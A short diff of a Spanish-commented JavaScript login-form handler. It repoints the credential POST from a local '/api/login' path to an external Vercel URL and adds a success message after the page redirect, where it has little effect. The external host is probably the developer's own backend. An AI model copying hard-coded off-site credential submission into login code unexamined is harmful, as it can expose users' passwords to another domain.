@@ -17,7 +17,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 
     // Enviar los datos al servidor
     // Ejemplo usando fetch
-    fetch('/api/login', {
+    fetch("https://exercisetech.vercel.app/", {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -29,6 +29,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         if (data.success) {
             // Redirigir o mostrar un mensaje de éxito
             window.location.href = 'pagina-inicial.html';
+            messageElement.textContent = 'Inicio de sesión exitoso.';
         } else {
             alert(data.message);
         }
